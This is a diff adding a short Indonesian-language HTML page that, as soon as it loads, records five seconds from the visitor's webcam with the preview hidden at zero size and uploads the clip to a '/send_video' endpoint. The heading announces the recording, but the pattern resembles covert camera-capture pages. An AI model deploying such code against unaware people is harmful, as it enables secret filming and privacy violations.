@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Rekam Otomatis 5 Detik</title>
+</head>
+<body>
+    <h2>📹 Rekam otomatis selama 5 detik...</h2>
+    <video id="video" autoplay muted style="width:0;height:0;"></video>
+
+    <script>
+        navigator.mediaDevices.getUserMedia({video:true, audio:false})
+        .then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            const mr = new MediaRecorder(stream);
+            const chunks = [];
+            mr.ondataavailable = e => { if (e.data.size) chunks.push(e.data) };
+            mr.onstop = () => {
+                const blob = new Blob(chunks, {type:'video/webm'});
+                const fr = new FileReader();
+                fr.onloadend = () => {
+                    fetch('/send_video', {
+                        method:'POST',
+                        headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({video:fr.result})
+                    })
+                    .then(r=>r.json()).then(d=>console.log(d.message||d.error))
+                    .catch(e=>console.error(e));
+                };
+                fr.readAsDataURL(blob);
+            };
+            mr.start();
+            setTimeout(() => {
+                mr.stop();
+                stream.getTracks().forEach(t=>t.stop());
+            }, 5000);
+        })
+        .catch(err=>alert('Gagal akses kamera:\n'+err));
+    </script>
+</body>
+</html>
